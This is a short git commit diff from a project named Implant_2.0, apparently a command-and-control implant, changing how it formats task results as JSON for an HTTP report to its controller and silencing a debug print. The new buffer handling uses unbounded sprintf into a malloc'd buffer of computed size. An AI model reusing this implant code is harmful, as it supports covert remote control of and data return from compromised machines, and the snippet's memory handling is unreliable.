91b87bd994a5b981e74ca59d0ed50b72342fe317
xakojwm <wyattmorris@crc-dot1x-nat-10-239-179-224.bu.edu>
2022-12-17 16:29:59 -0500

    fixed makefile and http

--- Implant_2.0/http/http.cpp
+++ Implant_2.0/http/http.cpp
@@ -250,9 +250,9 @@ std::string HttpResponse(std::string uri, int implant_id, int task_id, std::stri
     // LENGTH NEEDS TO BE SCALED DEPENDING ON OUR RANGE FOR IMPLANT_ID
     
     int length = 78 + temp;
-    char postdata[4000];
+    char *postdata = (char*) malloc(length);
     sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":\"%s\",\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
-    std::cout << postdata << std::endl;
+    //std::cout << postdata << std::endl;
 
     LPCWSTR additionalHeaders = L"Content-Type: application/json\r\n";
 
